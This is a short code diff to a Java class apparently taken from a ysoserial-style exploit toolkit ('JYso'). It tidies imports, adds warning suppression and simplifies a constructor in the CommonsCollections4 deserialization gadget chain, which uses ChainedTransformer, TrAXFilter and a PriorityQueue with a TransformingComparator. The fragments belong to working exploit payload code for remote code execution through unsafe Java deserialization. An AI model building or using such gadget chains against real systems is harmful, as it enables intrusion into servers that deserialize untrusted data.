@@ -5,7 +5,6 @@ import com.qi4l.JYso.gadgets.annotation.Dependencies;
 import com.qi4l.JYso.gadgets.utils.Gadgets;
 import com.qi4l.JYso.gadgets.utils.Reflections;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
-import org.apache.commons.collections4.Transformer;
 import org.apache.commons.collections4.comparators.TransformingComparator;
 import org.apache.commons.collections4.functors.ChainedTransformer;
 import org.apache.commons.collections4.functors.ConstantTransformer;
@@ -21,6 +20,7 @@ import java.util.Queue;
  * InvokerTransformer.
  */
 
+@SuppressWarnings({"rawtypes", "unchecked","unused"})
 @Dependencies({"org.apache.commons:commons-collections4:4.0"})
 @Authors({Authors.FROHOFF})
 public class cc4 implements ObjectPayload<Queue<Object>> {
@@ -39,7 +39,7 @@ public class cc4 implements ObjectPayload<Queue<Object>> {
         paramTypes = (Class[]) Reflections.getFieldValue(instantiate, "iParamTypes");
         args = (Object[]) Reflections.getFieldValue(instantiate, "iArgs");
 
-        ChainedTransformer chain = new ChainedTransformer(new Transformer[]{constant, instantiate});
+        ChainedTransformer chain = new ChainedTransformer(constant, instantiate);
 
         // create queue with numbers
         PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(chain));
